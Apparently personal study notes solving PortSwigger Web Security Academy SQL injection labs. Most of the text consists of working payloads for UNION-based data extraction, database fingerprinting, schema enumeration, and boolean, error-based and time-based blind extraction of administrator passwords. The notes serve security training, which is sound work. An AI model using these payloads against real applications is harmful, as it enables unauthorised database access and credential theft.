# Lab:  vulnerability in WHERE clause allowing retrieval of hidden data

![[Pasted image 20230215205601.png]]
![[Pasted image 20230215205623.png]]
#  vulnerability allowing login bypass

![[Pasted image 20230215210142.png]]
![[Pasted image 20230215210150.png]]

#  UNION attack, determining the number of columns returned by the query

![[Pasted image 20230221224752.png]]
`https://0aa9004f04a48654c00b45e500ab0085.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20null,null,null--%20-`

#  UNION attack, finding a column containing text
`'+UNION+SELECT+null,version(),null--+-`
![[Pasted image 20230221225619.png]]
column 2 is vulnerable 

![[Pasted image 20230221234811.png]]
![[Pasted image 20230221234843.png]]

#  UNION attack, retrieving data from other tables
`'+UNION+SELECT+null,null--+-`
2 columns
![[Pasted image 20230221235030.png]]
![[Pasted image 20230221235158.png]]
column 1 and 2 shows results on page
`' UNION SELECT null,table_name FROM information_schema.tables-- -`
![[Pasted image 20230221235245.png]]
`' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'-- -`
![[Pasted image 20230221235535.png]]
`'+UNION+SELECT+username,password+FROM+users--+-`
![[Pasted image 20230222000605.png]]
login as administrator to solve the challenge

#  UNION attack, retrieving multiple values in a single column
![[Pasted image 20230222000913.png]]
2 columns
only column 2 can work to show data
![[Pasted image 20230222000959.png]]
`' UNION SELECT null,username||password FROM users-- - `
![[Pasted image 20230222001143.png]]

# querying the database type and version on Oracle

## Hint: 
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: `UNION SELECT null FROM dual`

## Solution 
`'UNION+SELECT+'abc','abc'+FROM+dual--`
![[Pasted image 20230222002151.png]]
`'UNION SELECT 'abc',banner FROM v$version-- `
![[Pasted image 20230222002456.png]]

# querying the database type and version on MySQL and Microsoft

![[Pasted image 20230222004100.png]]
using `-- ` with space after as a comment
`' UNION SELECT NULL,version()--  `
![[Pasted image 20230222004206.png]]

# listing the database contents on non-Oracle databases
![[Pasted image 20230222005658.png]]
2 columns
both columns show results

`'+UNION+SELECT+'A',version()--+`
![[Pasted image 20230222005722.png]]
![[Pasted image 20230222005841.png]]
database is PostgreSQL

```
'+UNION+ALL+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_schema+!='information_schema'+AND+table_schema+!='mysql'+AND+table_schema+!%3d'performance_schema'--+ 
```
or without filters
`'+UNION+ALL+SELECT+NULL,table_name+FROM+information_schema.tables--+`
![[Pasted image 20230222010829.png]]
table: users_zuyyol
`'+UNION+ALL+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name%3d'users_zuyyol'--+`
![[Pasted image 20230222011031.png]]
columns:
	username_ntrpdn
	password_ltppoh

`'+UNION+ALL+SELECT+NULL,username_ntrpdn+||+password_ltppoh+FROM+users_zuyyol--+`
![[Pasted image 20230222011213.png]]

# listing the database contents on Oracle
2 columns
`'+UNION+SELECT+NULL,NULL+FROM+DUAL--`
![[Pasted image 20230222012423.png]]
both columns show results
`'+UNION+SELECT+NULL,table_name+FROM+all_tables--`
![[Pasted image 20230222012751.png]]
table: USERS_BKHMMC
`'+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_BKHMMC'--`
![[Pasted image 20230222012921.png]]
columns:
	USERNAME_IOEFVP
	PASSWORD_AOSSJL
`'+UNION+SELECT+NULL,USERNAME_IOEFVP+||+USERNAME_IOEFVP+||+PASSWORD_AOSSJL+FROM+USERS_BKHMMC+--`
![[Pasted image 20230222013205.png]]

# Blind SQL injection

![[Pasted image 20230222201539.png]]
trackingid cookie is vulnerable
![[Pasted image 20230222201736.png]]
checking for a table called users
`'UNION+SELECT+table_name+FROM+information_schema.tables+WHERE+table_name%3d'users'--+`
then checking for username administrator a is just a char
`'UNION+SELECT+'a'+from+users+where+username%3d'administrator'--+`
![[Pasted image 20230222210740.png]]
and because we know there is a column inside users called password we can get password length for administrator
`'UNION+SELECT+'a'+from+users+where+username%3d'administrator'+AND+length(password)>20`
![[Pasted image 20230222210913.png]]
![[Pasted image 20230222210931.png]]
password length is 20

`'UNION+SELECT+'a'+from+users+where+username%3d'administrator'+AND+substring(password,1,1)='a'`
using burp intruder
![[Pasted image 20230222214110.png]]
copy intruder results into file and then use 
`cut out -f 3 | tr -d '\n'` to get the password
![[Pasted image 20230222234201.png]]

password:
	hh6kjexkrrilbhooek0r


# Blind SQL injection conditions
using sub query to test target 
target is using oracle
`'||(SELECT '' FROM dual)||'`
![[Pasted image 20230223004709.png]]
checking for users table and user administrator
`||(SELECT '' FROM users where rownum = 1)||'`
when the condition is true it will produce error 
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
![[Pasted image 20230223013118.png]]
checking for password lengh 
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND length(password)>1)||'`
burp intruder
![[Pasted image 20230223013653.png]]

![[Pasted image 20230223014304.png]]
`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
![[Pasted image 20230223014331.png]]
![[Pasted image 20230223014401.png]]

password:
	2lx3zoy4uatifdex3hwv


# Blind SQL injection time based

`'||pg_sleep(10)||--'`
![[Pasted image 20230223213857.png]]

# Blind SQL injection with time delays and information retrieval

`'||pg_sleep(5)--`
![[Pasted image 20230223215129.png]]

`;'%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`![[Pasted image 20230223215904.png]]
Password is 20 chars
`'%3b SELECT CASE WHEN (SELECT 'a' from users where username='administrator' AND length(password)%3d20) = 'a' THEN pg_sleep(2) ELSE pg_sleep(0) END--`
![[Pasted image 20230223220746.png]]
changing threads to 1 and showing response timer
![[Pasted image 20230223222959.png]]

![[Pasted image 20230223222917.png]]

![[Pasted image 20230223223120.png]]
password:
	rngvyop7qbp41ceo1v38

Other way to write query
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

---
Tags: #SQL #SQLI #Oracle_sql #Postgresql #Blind_sql #manual_sql #union_sql #port_swigger 
Resources:
[PortSwigger](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder)
[PortSwigger Union Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder)
[PortSwigger cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
[[SQLi]]
[[SQL-Injection (SQLi)]]
[[Sql-maps]]


